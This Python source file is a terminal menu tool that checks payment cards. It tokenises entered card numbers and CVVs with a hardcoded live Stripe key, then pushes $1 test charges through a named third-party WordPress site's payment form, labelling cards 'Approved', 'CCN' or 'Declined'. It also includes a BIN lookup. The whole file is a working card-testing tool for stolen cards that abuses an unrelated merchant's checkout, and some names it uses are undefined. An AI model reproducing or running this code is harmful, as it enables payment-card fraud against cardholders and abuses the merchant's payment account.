import os
import sys
import re
import time
import json
import socket
import platform
from datetime import datetime
from typing import Dict, Optional
from .network import SessionManager
from .validators import CardData, parse_card, validate_card
from .ui import UI
from .logger import Logger

class OCSTENFramework:
    def __init__(self):
        self.logger = Logger()
        self.session = SessionManager()
        self.running = True
        self.start_time = datetime.now()
        self.ui = UI()
    
    def _get_input(self, prompt: str = "") -> str:
        try:
            if prompt:
                print(prompt)
            return input(self.ui.prompt()).strip()
        except (KeyboardInterrupt, EOFError):
            return "7"
    
    def _validate_card(self, card: CardData) -> Dict:
        self.logger.info(f"Processing card: {card.number[:6]}XXXXXX{card.number[-4:]}")
        if not card.valid_luhn:
            return {"status": "Invalid", "message": "Luhn checksum failed"}
        
        try:
            stripe_data = {
                "guid": self._generate_guid(),
                "muid": self._generate_muid(),
                "sid": self._generate_sid(),
                "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
                "card[name]": "John Doe",
                "card[number]": card.number,
                "card[exp_month]": card.month,
                "card[exp_year]": card.year,
                "card[cvc]": card.cvv
            }
            
            token_response = self.session.post(
                'https://api.stripe.com/v1/tokens',
                data=stripe_data
            )
            
            if not token_response or token_response.status_code != 200:
                return {"status": "Error", "message": "Stripe token generation failed"}
            
            token_id = token_response.json().get('id')
            if not token_id:
                return {"status": "Error", "message": "No token received"}
            
            payment_data = {
                "action": "wp_full_stripe_payment_charge",
                "formName": "default",
                "formNonce": self._get_form_nonce(),
                "fullstripe_name": "John Doe",
                "fullstripe_email": "john.doe@example.com",
                "fullstripe_custom_amount": "1",
                "fullstripe_amount_index": 0,
                "stripeToken": token_id
            }
            
            payment_response = self.session.post(
                'https://www.hwstjohn.com/wp-admin/admin-ajax.php',
                data=payment_data
            )
            
            if not payment_response:
                return {"status": "Error", "message": "Payment processing failed"}
            
            response_text = payment_response.text.lower()
            
            if 'true' in response_text:
                return {"status": "Approved", "message": "Transaction authorized"}
            elif 'security code' in response_text:
                return {"status": "CCN", "message": "Card number accepted"}
            elif 'false' in response_text:
                return {"status": "Declined", "message": "Transaction declined"}
            else:
                return {"status": "Unknown", "message": "Unexpected response"}
                
        except Exception as e:
            self.logger.error(f"Validation error: {str(e)[:50]}")
            return {"status": "Error", "message": f"Exception: {str(e)[:50]}"}
    
    def _generate_guid(self) -> str:
        import uuid
        return str(uuid.uuid4())
    
    def _generate_muid(self) -> str:
        import uuid
        return str(uuid.uuid4())
    
    def _generate_sid(self) -> str:
        import uuid
        return str(uuid.uuid4())
    
    def _get_form_nonce(self) -> str:
        try:
            response = self.session.get("https://www.hwstjohn.com/pay-now/")
            if response:
                import re
                nonce_match = re.search(r'formNonce" value="([^\'" >]+)', response.text)
                if nonce_match:
                    return nonce_match.group(1)
        except Exception:
            pass
        return "default_nonce"
    
    def _check_bin(self, bin_code: str) -> Dict:
        try:
            response = self.session.get(f'https://bins.ws/search?bins={bin_code[:6]}')
            if response:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                page_div = soup.find("div", {"class": "page"})
                if page_div:
                    text = page_div.text
                    lines = [line.strip() for line in text.split('\n') if line.strip()]
                    result = {}
                    for line in lines:
                        if ':' in line:
                            key, value = line.split(':', 1)
                            result[key.strip()] = value.strip()
                    return result
        except Exception as e:
            self.logger.error(f"BIN lookup error: {str(e)[:50]}")
        
        return {
            "BIN": bin_code[:6],
            "Bank": "Unknown",
            "Country": "Unknown",
            "Type": "Unknown",
            "Brand": "Unknown",
            "Level": "Unknown"
        }
    
    def _system_info(self) -> Dict:
        return {
            "System": platform.system(),
            "Release": platform.release(),
            "Python": platform.python_version(),
            "Uptime": str(datetime.now() - self.start_time).split('.')[0],
            "Logs": LOG_DIR,
            "Cache": CACHE_DIR
        }
    
    def _network_test(self) -> Dict:
        results = {}
        for host in ["google.com", "github.com", "api.stripe.com"]:
            try:
                start = time.time()
                socket.gethostbyname(host)
                results[host] = f"{round((time.time() - start) * 1000, 2)}ms"
            except:
                results[host] = "Failed"
        return results
    
    def _show_logs(self):
        try:
            import os
            log_files = sorted([f for f in os.listdir(LOG_DIR) if f.endswith('.log')], reverse=True)
            if not log_files:
                self.ui.result({"message": "No logs found"}, "Log Status")
                return
            latest = os.path.join(LOG_DIR, log_files[0])
            with open(latest, 'r', encoding='utf-8') as f:
                lines = f.readlines()[-20:]
            print(f"\nLog file: {log_files[0]}")
            print("-" * 40)
            for line in lines:
                print(line.strip())
            print("-" * 40)
        except Exception as e:
            self.logger.error(f"Cannot read logs: {str(e)[:50]}")
    
    def main_loop(self):
        while self.running:
            self.ui.clear()
            self.ui.header()
            self.ui.menu()
            choice = self._get_input()
            
            if choice == '1':
                self.ui.clear()
                self.ui.header()
                card_input = input(f"{Fore.CYAN}enter card (number|month|year|cvv){Fore.RESET} > ")
                if card_input:
                    card = parse_card(card_input)
                    if card:
                        for i in range(1, 4):
                            self.ui.progress(i, 3)
                            time.sleep(0.3)
                        print()
                        result = self._validate_card(card)
                        data = {
                            "card": f"{card.number[:6]}XXXXXX{card.number[-4:]}",
                            "bin": card.bin,
                            "month/year": f"{card.month}/{card.year}",
                            "status": result.get("status", "Unknown"),
                            "message": result.get("message", "No response")
                        }
                        self.ui.result(data, "Validation Result")
                    else:
                        self.logger.error("Invalid card format")
                input("\npress ENTER to continue...")
            
            elif choice == '2':
                self.ui.clear()
                self.ui.header()
                bin_input = input(f"{Fore.CYAN}enter BIN (first 6 digits){Fore.RESET} > ")
                if bin_input and bin_input[:6].isdigit():
                    data = self._check_bin(bin_input[:6])
                    self.ui.result(data, "BIN Information")
                else:
                    self.logger.error("Invalid BIN")
                input("\npress ENTER to continue...")
            
            elif choice == '3':
                self.ui.clear()
                self.ui.header()
                data = self._system_info()
                self.ui.result(data, "System Information")
                input("\npress ENTER to continue...")
            
            elif choice == '4':
                self.ui.clear()
                self.ui.header()
                data = self._network_test()
                self.ui.result(data, "Network Diagnostics")
                input("\npress ENTER to continue...")
            
            elif choice == '5':
                self.ui.clear()
                self.ui.header()
                self._show_logs()
                input("\npress ENTER to continue...")
            
            elif choice == '6':
                continue
            
            elif choice == '7':
                self.running = False
                print(f"\n{Fore.GREEN}Session terminated. Goodbye.{Fore.RESET}")
                sys.exit(0)
            
            else:
                self.logger.warning(f"Unknown command: {choice}")
                time.sleep(1)
